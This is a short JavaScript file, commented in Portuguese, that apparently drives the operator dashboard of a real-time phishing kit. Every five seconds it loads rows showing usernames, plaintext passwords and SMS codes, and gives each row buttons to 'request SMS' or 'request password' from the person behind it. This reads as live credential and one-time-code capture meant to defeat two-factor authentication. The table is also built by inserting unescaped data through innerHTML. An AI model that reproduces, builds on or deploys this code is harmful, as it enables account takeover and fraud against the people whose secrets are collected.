document.addEventListener("DOMContentLoaded", function () {
    function fetchOperatorData() {
        fetch("../src/fetch_operator_data.php")
            .then((response) => response.json())
            .then((data) => {
                const tableBody = document.getElementById("operator-data");
                tableBody.innerHTML = ""; // Limpa a tabela atual

                data.forEach((user) => {
                    const row = document.createElement("tr");
                    row.innerHTML = `
                        <td>${user.id}</td>
                        <td>${user.username}</td>
                        <td>${user.tipo}</td>
                        <td>${user.senha || ""}</td>
                        <td>${user.sms_code || ""}</td>
                        <td>${user.status}</td>
                        <td>
                            <form id="action-form-${user.id}" method="POST">
                                <input type="hidden" name="user_id" value="${user.id}">
                                <input type="hidden" id="action-input-${user.id}" name="action" value="">
                                <button type="button" onclick="submitAction('aguardando_sms', ${user.id})">Pedir SMS</button>
                                <button type="button" onclick="submitAction('aguardando_senha', ${user.id})">Pedir Senha</button>
                            </form>
                        </td>
                        <td>${user.created_at}</td>
                    `;
                    tableBody.appendChild(row);
                });
            })
            .catch((error) => console.error("Erro ao buscar dados:", error));
    }

    setInterval(fetchOperatorData, 5000); // Atualiza a cada 5 segundos
});
